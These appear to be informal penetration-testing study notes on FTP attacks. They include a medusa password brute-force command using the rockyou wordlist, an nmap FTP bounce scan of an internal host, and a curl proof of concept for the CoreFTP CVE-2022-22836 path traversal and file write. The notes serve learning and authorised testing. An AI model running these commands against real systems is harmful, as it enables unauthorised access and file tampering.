```shell-session
 medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```
can use -U for username list

More importantly
# FTP Bounce Attack 
use FTP server to deliver outbound traffic to another device 
use PORT command to trick FTP connection into running commands and getting information from a device other than the intended server


## Example
Consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.

```shell-session
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

but modern ftp servers have protections unless its misconfigured 

# CoreFTP CVE-2022-22836
FTP service does not correctly process HTTP PUT request and that leads to an authenticated directory/path traversal and arbitrary file write outside the directory to which the service has access to

FTP services that uses HTTP POST request to upload files
```shell-session
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
